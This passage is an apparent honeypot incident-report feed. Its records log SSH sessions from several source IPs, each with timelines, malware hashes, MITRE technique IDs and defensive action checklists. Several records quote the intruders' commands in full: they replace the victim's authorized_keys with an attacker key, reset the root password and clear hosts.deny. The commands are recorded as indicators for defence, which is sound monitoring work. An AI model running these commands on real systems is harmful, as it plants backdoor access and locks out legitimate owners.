| `2026-05-06 15:41:55` | `cowrie.command.input` |
| `2026-05-06 15:41:55` | `cowrie.log.closed` |
| `2026-05-06 15:41:56` | `cowrie.session.params` |
| `2026-05-06 15:41:56` | `cowrie.command.input` |
| `2026-05-06 15:41:56` | `cowrie.log.closed` |
| `2026-05-06 15:41:56` | `cowrie.session.params` |
| `2026-05-06 15:41:56` | `cowrie.command.input` |
| `2026-05-06 15:41:56` | `cowrie.log.closed` |
| `2026-05-06 15:41:56` | `cowrie.session.params` |
| `2026-05-06 15:41:56` | `cowrie.command.input` |
| `2026-05-06 15:41:57` | `cowrie.log.closed` |
| `2026-05-06 15:41:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.39.225[.]73` to AbuseIPDB if not already reported
- [ ] Block `103.39.225[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1701ebbe1ce

| Field | Detail |
|---|---|
| **Source IP** | `103.39.225[.]73` |
| **First Seen** | 2026-05-06 15:44 |
| **Last Seen** | 2026-05-06 15:44 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:RFm3yuH9tRSD"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 15:44:04` | `cowrie.session.connect` |
| `2026-05-06 15:44:04` | `cowrie.client.version` |
| `2026-05-06 15:44:04` | `cowrie.client.kex` |
| `2026-05-06 15:44:05` | `cowrie.login.success` |
| `2026-05-06 15:44:05` | `cowrie.session.params` |
| `2026-05-06 15:44:05` | `cowrie.command.input` |
| `2026-05-06 15:44:05` | `cowrie.command.failed` |
| `2026-05-06 15:44:05` | `cowrie.log.closed` |
| `2026-05-06 15:44:06` | `cowrie.session.params` |
| `2026-05-06 15:44:06` | `cowrie.command.input` |
| `2026-05-06 15:44:06` | `cowrie.session.file_download` |
| `2026-05-06 15:44:06` | `cowrie.log.closed` |
| `2026-05-06 15:44:19` | `cowrie.session.params` |
| `2026-05-06 15:44:19` | `cowrie.command.input` |
| `2026-05-06 15:44:19` | `cowrie.log.closed` |
| `2026-05-06 15:44:20` | `cowrie.session.params` |
| `2026-05-06 15:44:20` | `cowrie.command.input` |
| `2026-05-06 15:44:20` | `cowrie.log.closed` |
| `2026-05-06 15:44:20` | `cowrie.session.params` |
| `2026-05-06 15:44:20` | `cowrie.command.input` |
| `2026-05-06 15:44:20` | `cowrie.session.file_download` |
| `2026-05-06 15:44:20` | `cowrie.log.closed` |
| `2026-05-06 15:44:20` | `cowrie.session.params` |
| `2026-05-06 15:44:20` | `cowrie.command.input` |
| `2026-05-06 15:44:21` | `cowrie.log.closed` |
| `2026-05-06 15:44:21` | `cowrie.session.params` |
| `2026-05-06 15:44:21` | `cowrie.command.input` |
| `2026-05-06 15:44:21` | `cowrie.log.closed` |
| `2026-05-06 15:44:21` | `cowrie.session.params` |
| `2026-05-06 15:44:21` | `cowrie.command.input` |
| `2026-05-06 15:44:21` | `cowrie.command.input` |
| `2026-05-06 15:44:21` | `cowrie.log.closed` |
| `2026-05-06 15:44:22` | `cowrie.session.params` |
| `2026-05-06 15:44:22` | `cowrie.command.input` |
| `2026-05-06 15:44:22` | `cowrie.log.closed` |
| `2026-05-06 15:44:23` | `cowrie.session.params` |
| `2026-05-06 15:44:23` | `cowrie.command.input` |
| `2026-05-06 15:44:23` | `cowrie.log.closed` |
| `2026-05-06 15:44:23` | `cowrie.session.params` |
| `2026-05-06 15:44:23` | `cowrie.command.input` |
| `2026-05-06 15:44:23` | `cowrie.log.closed` |
| `2026-05-06 15:44:23` | `cowrie.session.params` |
| `2026-05-06 15:44:23` | `cowrie.command.input` |
| `2026-05-06 15:44:24` | `cowrie.log.closed` |
| `2026-05-06 15:44:24` | `cowrie.session.params` |
| `2026-05-06 15:44:24` | `cowrie.command.input` |
| `2026-05-06 15:44:24` | `cowrie.log.closed` |
| `2026-05-06 15:44:24` | `cowrie.session.params` |
| `2026-05-06 15:44:24` | `cowrie.command.input` |
| `2026-05-06 15:44:24` | `cowrie.log.closed` |
| `2026-05-06 15:44:25` | `cowrie.session.params` |
| `2026-05-06 15:44:25` | `cowrie.command.input` |
| `2026-05-06 15:44:25` | `cowrie.log.closed` |
| `2026-05-06 15:44:26` | `cowrie.session.params` |
| `2026-05-06 15:44:26` | `cowrie.command.input` |
| `2026-05-06 15:44:26` | `cowrie.log.closed` |
| `2026-05-06 15:44:26` | `cowrie.session.params` |
| `2026-05-06 15:44:26` | `cowrie.command.input` |
| `2026-05-06 15:44:26` | `cowrie.log.closed` |
| `2026-05-06 15:44:27` | `cowrie.session.params` |
| `2026-05-06 15:44:27` | `cowrie.command.input` |
| `2026-05-06 15:44:27` | `cowrie.log.closed` |
| `2026-05-06 15:44:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.39.225[.]73` to AbuseIPDB if not already reported
- [ ] Block `103.39.225[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ac35cdd9e97

| Field | Detail |
|---|---|
| **Source IP** | `103.39.225[.]73` |
| **First Seen** | 2026-05-06 15:50 |
| **Last Seen** | 2026-05-06 15:50 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:a6Z2QYvuMiKP"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 15:50:23` | `cowrie.session.connect` |
| `2026-05-06 15:50:23` | `cowrie.client.version` |
| `2026-05-06 15:50:23` | `cowrie.client.kex` |
| `2026-05-06 15:50:23` | `cowrie.login.success` |
| `2026-05-06 15:50:24` | `cowrie.session.params` |
| `2026-05-06 15:50:24` | `cowrie.command.input` |
| `2026-05-06 15:50:24` | `cowrie.command.failed` |
| `2026-05-06 15:50:24` | `cowrie.log.closed` |
| `2026-05-06 15:50:24` | `cowrie.session.params` |
| `2026-05-06 15:50:24` | `cowrie.command.input` |
| `2026-05-06 15:50:24` | `cowrie.session.file_download` |
| `2026-05-06 15:50:24` | `cowrie.log.closed` |
| `2026-05-06 15:50:38` | `cowrie.session.params` |
| `2026-05-06 15:50:38` | `cowrie.command.input` |
| `2026-05-06 15:50:38` | `cowrie.log.closed` |
| `2026-05-06 15:50:38` | `cowrie.session.params` |
| `2026-05-06 15:50:38` | `cowrie.command.input` |
| `2026-05-06 15:50:38` | `cowrie.log.closed` |
| `2026-05-06 15:50:38` | `cowrie.session.params` |
| `2026-05-06 15:50:38` | `cowrie.command.input` |
| `2026-05-06 15:50:38` | `cowrie.session.file_download` |
| `2026-05-06 15:50:38` | `cowrie.log.closed` |
| `2026-05-06 15:50:39` | `cowrie.session.params` |
| `2026-05-06 15:50:39` | `cowrie.command.input` |
| `2026-05-06 15:50:39` | `cowrie.log.closed` |
| `2026-05-06 15:50:39` | `cowrie.session.params` |
| `2026-05-06 15:50:39` | `cowrie.command.input` |
| `2026-05-06 15:50:39` | `cowrie.log.closed` |
| `2026-05-06 15:50:40` | `cowrie.session.params` |
| `2026-05-06 15:50:40` | `cowrie.command.input` |
| `2026-05-06 15:50:40` | `cowrie.command.input` |
| `2026-05-06 15:50:40` | `cowrie.log.closed` |
| `2026-05-06 15:50:40` | `cowrie.session.params` |
| `2026-05-06 15:50:40` | `cowrie.command.input` |
| `2026-05-06 15:50:40` | `cowrie.log.closed` |
| `2026-05-06 15:50:40` | `cowrie.session.params` |
| `2026-05-06 15:50:40` | `cowrie.command.input` |
| `2026-05-06 15:50:40` | `cowrie.log.closed` |
| `2026-05-06 15:50:41` | `cowrie.session.params` |
| `2026-05-06 15:50:41` | `cowrie.command.input` |
| `2026-05-06 15:50:41` | `cowrie.log.closed` |
| `2026-05-06 15:50:41` | `cowrie.session.params` |
| `2026-05-06 15:50:41` | `cowrie.command.input` |
| `2026-05-06 15:50:41` | `cowrie.log.closed` |
| `2026-05-06 15:50:42` | `cowrie.session.params` |
| `2026-05-06 15:50:42` | `cowrie.command.input` |
| `2026-05-06 15:50:42` | `cowrie.log.closed` |
| `2026-05-06 15:50:42` | `cowrie.session.params` |
| `2026-05-06 15:50:42` | `cowrie.command.input` |
| `2026-05-06 15:50:42` | `cowrie.log.closed` |
| `2026-05-06 15:50:42` | `cowrie.session.params` |
| `2026-05-06 15:50:42` | `cowrie.command.input` |
| `2026-05-06 15:50:42` | `cowrie.log.closed` |
| `2026-05-06 15:50:43` | `cowrie.session.params` |
| `2026-05-06 15:50:43` | `cowrie.command.input` |
| `2026-05-06 15:50:43` | `cowrie.log.closed` |
| `2026-05-06 15:50:43` | `cowrie.session.params` |
| `2026-05-06 15:50:43` | `cowrie.command.input` |
| `2026-05-06 15:50:43` | `cowrie.log.closed` |
| `2026-05-06 15:50:44` | `cowrie.session.params` |
| `2026-05-06 15:50:44` | `cowrie.command.input` |
| `2026-05-06 15:50:44` | `cowrie.log.closed` |
| `2026-05-06 15:50:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.39.225[.]73` to AbuseIPDB if not already reported
- [ ] Block `103.39.225[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e271b5902a7c

| Field | Detail |
|---|---|
| **Source IP** | `182.217.16[.]126` |
| **First Seen** | 2026-05-06 15:54 |
| **Last Seen** | 2026-05-06 15:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 15:54:47` | `cowrie.session.connect` |
| `2026-05-06 15:54:47` | `cowrie.client.version` |
| `2026-05-06 15:54:47` | `cowrie.client.kex` |
| `2026-05-06 15:54:48` | `cowrie.login.success` |
| `2026-05-06 15:54:48` | `cowrie.session.params` |
| `2026-05-06 15:54:48` | `cowrie.command.input` |
| `2026-05-06 15:54:48` | `cowrie.command.failed` |
| `2026-05-06 15:54:48` | `cowrie.log.closed` |
| `2026-05-06 15:54:49` | `cowrie.session.params` |
| `2026-05-06 15:54:49` | `cowrie.command.input` |
| `2026-05-06 15:54:49` | `cowrie.session.file_download` |
| `2026-05-06 15:54:49` | `cowrie.log.closed` |
| `2026-05-06 15:54:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.217.16[.]126` to AbuseIPDB if not already reported
- [ ] Block `182.217.16[.]126` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89538c51e2e6

| Field | Detail |
|---|---|
| **Source IP** | `182.217.16[.]126` |
| **First Seen** | 2026-05-06 15:54 |
| **Last Seen** | 2026-05-06 15:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 15:54:51` | `cowrie.session.connect` |
| `2026-05-06 15:54:51` | `cowrie.client.version` |
| `2026-05-06 15:54:51` | `cowrie.client.kex` |
| `2026-05-06 15:54:52` | `cowrie.login.success` |
| `2026-05-06 15:54:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.217.16[.]126` to AbuseIPDB if not already reported
- [ ] Block `182.217.16[.]126` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1c7abf3cf18

| Field | Detail |
|---|---|
| **Source IP** | `182.217.16[.]126` |
| **First Seen** | 2026-05-06 15:56 |
| **Last Seen** | 2026-05-06 15:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 15:56:44` | `cowrie.session.connect` |
| `2026-05-06 15:56:44` | `cowrie.client.version` |
| `2026-05-06 15:56:44` | `cowrie.client.kex` |
| `2026-05-06 15:56:45` | `cowrie.login.success` |
| `2026-05-06 15:56:45` | `cowrie.session.params` |
| `2026-05-06 15:56:45` | `cowrie.command.input` |
| `2026-05-06 15:56:45` | `cowrie.command.failed` |
| `2026-05-06 15:56:45` | `cowrie.log.closed` |
| `2026-05-06 15:56:46` | `cowrie.session.params` |
| `2026-05-06 15:56:46` | `cowrie.command.input` |
| `2026-05-06 15:56:46` | `cowrie.session.file_download` |
| `2026-05-06 15:56:46` | `cowrie.log.closed` |
| `2026-05-06 15:56:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.217.16[.]126` to AbuseIPDB if not already reported
- [ ] Block `182.217.16[.]126` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23b06f6d8d92

| Field | Detail |
|---|---|
| **Source IP** | `182.217.16[.]126` |
| **First Seen** | 2026-05-06 15:56 |
| **Last Seen** | 2026-05-06 15:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 15:56:48` | `cowrie.session.connect` |
| `2026-05-06 15:56:48` | `cowrie.client.version` |
| `2026-05-06 15:56:48` | `cowrie.client.kex` |
| `2026-05-06 15:56:48` | `cowrie.login.success` |
| `2026-05-06 15:56:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.217.16[.]126` to AbuseIPDB if not already reported
- [ ] Block `182.217.16[.]126` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6657612316bf

| Field | Detail |
|---|---|
| **Source IP** | `43.227.185[.]238` |
| **First Seen** | 2026-05-06 16:03 |
| **Last Seen** | 2026-05-06 16:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:03:23` | `cowrie.session.connect` |
| `2026-05-06 16:03:23` | `cowrie.client.version` |
| `2026-05-06 16:03:23` | `cowrie.client.kex` |
| `2026-05-06 16:03:23` | `cowrie.login.success` |
| `2026-05-06 16:03:23` | `cowrie.session.params` |
| `2026-05-06 16:03:23` | `cowrie.command.input` |
| `2026-05-06 16:03:23` | `cowrie.command.failed` |
| `2026-05-06 16:03:23` | `cowrie.log.closed` |
| `2026-05-06 16:03:24` | `cowrie.session.params` |
| `2026-05-06 16:03:24` | `cowrie.command.input` |
| `2026-05-06 16:03:24` | `cowrie.session.file_download` |
| `2026-05-06 16:03:24` | `cowrie.log.closed` |
| `2026-05-06 16:03:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.227.185[.]238` to AbuseIPDB if not already reported
- [ ] Block `43.227.185[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4df9ab33515

| Field | Detail |
|---|---|
| **Source IP** | `43.227.185[.]238` |
| **First Seen** | 2026-05-06 16:03 |
| **Last Seen** | 2026-05-06 16:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:03:25` | `cowrie.session.connect` |
| `2026-05-06 16:03:25` | `cowrie.client.version` |
| `2026-05-06 16:03:25` | `cowrie.client.kex` |
| `2026-05-06 16:03:25` | `cowrie.login.success` |
| `2026-05-06 16:03:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.227.185[.]238` to AbuseIPDB if not already reported
- [ ] Block `43.227.185[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3522402551d

| Field | Detail |
|---|---|
| **Source IP** | `43.227.185[.]238` |
| **First Seen** | 2026-05-06 16:09 |
| **Last Seen** | 2026-05-06 16:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:09:45` | `cowrie.session.connect` |
| `2026-05-06 16:09:45` | `cowrie.client.version` |
| `2026-05-06 16:09:45` | `cowrie.client.kex` |
| `2026-05-06 16:09:45` | `cowrie.login.success` |
| `2026-05-06 16:09:45` | `cowrie.session.params` |
| `2026-05-06 16:09:45` | `cowrie.command.input` |
| `2026-05-06 16:09:45` | `cowrie.command.failed` |
| `2026-05-06 16:09:45` | `cowrie.log.closed` |
| `2026-05-06 16:09:45` | `cowrie.session.params` |
| `2026-05-06 16:09:45` | `cowrie.command.input` |
| `2026-05-06 16:09:45` | `cowrie.session.file_download` |
| `2026-05-06 16:09:45` | `cowrie.log.closed` |
| `2026-05-06 16:09:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.227.185[.]238` to AbuseIPDB if not already reported
- [ ] Block `43.227.185[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-421c510b0a73

| Field | Detail |
|---|---|
| **Source IP** | `43.227.185[.]238` |
| **First Seen** | 2026-05-06 16:09 |
| **Last Seen** | 2026-05-06 16:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:09:46` | `cowrie.session.connect` |
| `2026-05-06 16:09:46` | `cowrie.client.version` |
| `2026-05-06 16:09:46` | `cowrie.client.kex` |
| `2026-05-06 16:09:47` | `cowrie.login.success` |
| `2026-05-06 16:09:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.227.185[.]238` to AbuseIPDB if not already reported
- [ ] Block `43.227.185[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-510f824305a6

| Field | Detail |
|---|---|
| **Source IP** | `43.227.185[.]238` |
| **First Seen** | 2026-05-06 16:10 |
| **Last Seen** | 2026-05-06 16:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:10:49` | `cowrie.session.connect` |
| `2026-05-06 16:10:49` | `cowrie.client.version` |
| `2026-05-06 16:10:49` | `cowrie.client.kex` |
| `2026-05-06 16:10:49` | `cowrie.login.success` |
| `2026-05-06 16:10:49` | `cowrie.session.params` |
| `2026-05-06 16:10:49` | `cowrie.command.input` |
| `2026-05-06 16:10:49` | `cowrie.command.failed` |
| `2026-05-06 16:10:49` | `cowrie.log.closed` |
| `2026-05-06 16:10:49` | `cowrie.session.params` |
| `2026-05-06 16:10:49` | `cowrie.command.input` |
| `2026-05-06 16:10:49` | `cowrie.session.file_download` |
| `2026-05-06 16:10:49` | `cowrie.log.closed` |
| `2026-05-06 16:10:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.227.185[.]238` to AbuseIPDB if not already reported
- [ ] Block `43.227.185[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bf06e5e0f41

| Field | Detail |
|---|---|
| **Source IP** | `43.227.185[.]238` |
| **First Seen** | 2026-05-06 16:10 |
| **Last Seen** | 2026-05-06 16:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
